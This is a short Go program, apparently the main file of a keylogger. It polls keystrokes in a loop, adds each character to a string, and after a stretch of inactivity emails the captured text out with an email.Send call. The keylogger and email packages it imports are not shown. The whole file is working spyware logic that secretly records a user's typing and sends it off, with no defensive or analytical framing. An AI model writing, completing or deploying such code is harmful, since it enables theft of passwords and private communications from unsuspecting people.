package main

import (
	"fmt"
	"time"

	"./email"
	"./keylogger"
)

const (
	delayKeyfetchMS = 5
)

func main() {
	kl := keylogger.NewKeylogger()
	emptyCount := 0
	var text string

	for {
		key := kl.GetKey()

		if !key.Empty {
			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
			text += string(key.Rune)
			emptyCount = 0
		}

		emptyCount++

		fmt.Printf("Empty count: %d\r", emptyCount)

		if emptyCount == 1*2000 {
			fmt.Printf(text)
			email.Send(text)
		}

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
